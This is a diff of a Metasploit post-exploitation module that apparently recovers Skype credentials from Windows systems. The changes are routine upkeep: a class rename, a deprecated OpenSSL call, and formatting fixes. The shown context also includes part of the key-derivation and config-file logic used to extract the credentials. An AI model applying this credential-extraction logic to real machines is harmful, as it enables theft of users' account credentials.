@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex'
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
 
@@ -124,7 +121,7 @@ puts hash.hexdigest
     # Concatinate SHA digests for AES key
     sha = Digest::SHA1.digest("\x00\x00\x00\x00" + salt) + Digest::SHA1.digest("\x00\x00\x00\x01" + salt)
 
-    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
+    aes = OpenSSL::Cipher.new("AES-256-CBC")
     aes.encrypt
     aes.key = sha[0,32] # Use only 32 bytes of key
     final = aes.update([0].pack("N*") * 4) # Encrypt 16 \x00 bytes
@@ -147,7 +144,7 @@ puts hash.hexdigest
   def get_config_creds(salt)
     users = []
     appdatapath = expand_path("%AppData%") + "\\Skype"
-    print_status ("Checking for config files in %APPDATA%")
+    print_status("Checking for config files in %APPDATA%")
     users = get_config_users(appdatapath)
     if users.any?
       users.each do |user|
@@ -174,6 +171,5 @@ puts hash.hexdigest
       print_error "No salt found. Cannot continue without salt, exiting"
     end
   end
-
 end
 
